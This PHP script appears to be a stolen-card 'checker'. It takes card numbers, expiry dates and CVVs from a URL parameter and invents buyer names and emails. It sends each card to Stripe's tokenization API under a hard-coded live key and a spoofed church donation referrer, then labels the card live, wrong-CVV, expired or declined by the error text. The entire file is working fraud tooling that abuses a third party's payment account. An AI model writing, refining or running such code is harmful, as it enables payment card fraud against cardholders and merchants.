<?php
    
    error_reporting(0);
    
    function multiexplode($delimiters, $string) {
        $one = str_replace($delimiters, $delimiters[0], $string);
        $two = explode($delimiters[0], $one);
        return $two;
    }
    $lista = $_GET['lista'];
    $cc = multiexplode(array(":", "|", "»"), $lista)[0];
    $mes = multiexplode(array(":", "|", "»"), $lista)[1];
    $ano = multiexplode(array(":", "|", "»"), $lista)[2];
    $cvv = multiexplode(array(":", "|", "»"), $lista)[3];
    function getStr2($string, $start, $end) {
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
    }

    function dadosnome(){
        $nome = file("lista_nomes.txt");
        $mynome = rand(0, sizeof($nome)-1);
        $nome = $nome[$mynome];
        return $nome;
    }
    function dadossobre(){
        $sobrenome = file("lista_sobrenomes.txt");
        $mysobrenome = rand(0, sizeof($sobrenome)-1);
        $sobrenome = $sobrenome[$mysobrenome];
        return $sobrenome;
    }
    function email($nome){
        $email = preg_replace('<\W+>', "", $nome).rand(0000,9999)."@gmail.com";
        return $email;
    }

    $nome = dadosnome();
    $sobrenome = dadossobre();
    $email = email($nome);
    $keys = array(
    ELO_1 => 'pk_live_F2JsmUDsxHN2aHEi9Irr4yfS', //ELO
    ); 
    $key = array_rand($keys);
    $keyStripe = $keys[$key];
       $ch = curl_init();
    curl_close($curl);
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    //curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
    //curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                                               'Host: api.stripe.com',
                                               'accept: application/json',
                                               'accept-language: pt-BR',
                                               'content-type: application/x-www-form-urlencoded',
                                               'origin: https://checkout.stripe.com',
                                               'referer: https://checkout.stripe.com/m/v3/index-7f66c3d8addf7af4ffc48af15300432a.html?distinct_id=527bada4-6936-dada-6728-592f40803445',
                                               'user-agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36',
                                               ));
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$email.'&validation_type=card&payment_user_agent=Stripe+Checkout+v3+checkout-manhattan+(stripe.js%2Fa44017d)&referrer=https%3A%2F%2Fwww.christcongregation.org%2Fdonate%2F&pasted_fields=number&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'&card[name]=Carlos Conseica&time_on_page=90454&guid=7cb6aff8-afaa-4f28-84c1-c43ab3656b88&muid=ecd09dcc-814c-4dba-96fb-974e1a6cb5bb&sid=0665d775-9ef3-4dfe-8a1e-9ca2b016d7ed&key='.$keyStripe.'');
    $resultado = curl_exec($ch);
if(strpos($resultado, 'processing_error')) {
$retorno = getStr2($resultado, 'message": "', '",');
$live = '<span class="badge badge-success">✅ ʟɪᴠᴇ ɢᴇʀᴀᴅᴀ</span><span class="badge badge-dark">»</span></td></tr><label class="badge badge-secondary">'.$cc.' » '.$mes.' » '.$ano.' » '.$cvv.'</label><span class="badge badge-dark">»</span></td></tr><span class="badge badge-dark">»</span></td></tr><label class="badge badge-primary">Retorno: Try again in a little bit.</label><span class="badge badge-dark">»</span></td></tr><span class="badge badge-primary">Gate: '.$key."</span></td></tr><span class='badge badge-dark'>»</span></td></tr><span class='badge badge-primary'>©𝕃𝕃𝕆𝕋𝕌𝕊</span>";
echo $live;
}elseif(strpos($resultado, "Your card's security code is incorrect.")){
 $retorno = getStr2($resultado, 'message": "', '",');
 $live = '<span class="badge badge-success">✅ ʟɪᴠᴇ ɢᴇʀᴀᴅᴀ</span><span class="badge badge-dark">»</span></td></tr><label class="badge badge-secondary">'.$cc.' » '.$mes.' » '.$ano.' » '.$cvv.'</label><span class="badge badge-dark">»</span></td></tr><span class="badge badge-dark">»</span></td></tr><label class="badge badge-primary">Retorno: CVV</label><span class="badge badge-dark">»</span></td></tr><span class="badge badge-primary">Gate: '.$key."</span></td></tr><span class='badge badge-dark'>»</span></td></tr><span class='badge badge-primary'>©𝕃𝕃𝕆𝕋𝕌𝕊</span>";
echo "$live<br>";
}elseif(strpos($resultado, 'message')){
$retorno = getStr2($resultado, 'message": "', '",');
echo '<span class="badge badge-danger">✘ REPROVADA</span><span class="badge badge-dark">»</span></td></tr><label class="badge badge-secondary">'.$cc.' » '.$mes.' » '.$ano.' » '.$cvv.'</label><span class="badge badge-dark">»</span></td></tr></td></tr><span class="badge badge-dark">»</span></td></tr><label class="badge badge-primary">Retorno: '.$retorno.'</label><span class="badge badge-dark">»</span></td></tr><span class="badge badge-primary">Gate: '.$key."</span></td></tr><span class='badge badge-dark'>»</span></td></tr><span class='badge badge-primary'>©𝕃𝕃𝕆𝕋𝕌𝕊</span></td></tr>";

}elseif(strpos($resultado, 'Your card has expired.')){
 $retorno = getStr2($resultado, 'message": "', '",');
echo '<span class="badge badge-danger">✘ REPROVADA</span><span class="badge badge-dark">»</span></td></tr><label class="badge badge-secondary">'.$cc.' » '.$mes.' » '.$ano.' » '.$cvv.'</label><span class="badge badge-dark">»</span></td></tr><span class="badge badge-dark">»</span></td></tr><label class="badge badge-primary">Retorno: EXPIRED_CARD</label><span class="badge badge-primary">Gate</span></td></tr>'.$key."ㅤ>ㅤ<span class='badge badge-primary'>©𝕃𝕃𝕆𝕋𝕌𝕊</span></td></tr>"; 

}elseif(strpos($resultado, 'token')){
echo '<span class="badge badge-warning">❗ REPROVADA GATE</span><span class="badge badge-dark">»</span></td></tr><label class="badge badge-secondary">'.$cc.' » '.$mes.' » '.$ano.' » '.$cvv.'</label><span class="badge badge-dark">»</span></td></tr><span class="badge badge-primary">Gate: '.$key."</span></td></tr><span class='badge badge-primary'>©𝕃𝕃𝕆𝕋𝕌𝕊</span></td></tr>";

}else {
 echo '<span class="badge badge-warning">❗ REPROVADA PROXY</span><span class="badge badge-dark">»</span></td></tr><label class="badge badge-secondary">'.$cc.' » '.$mes.' » '.$ano.' » '.$cvv." <span class='badge badge-primary'>©𝕃𝕃𝕆𝕋𝕌𝕊</span></td></tr>";
}
?>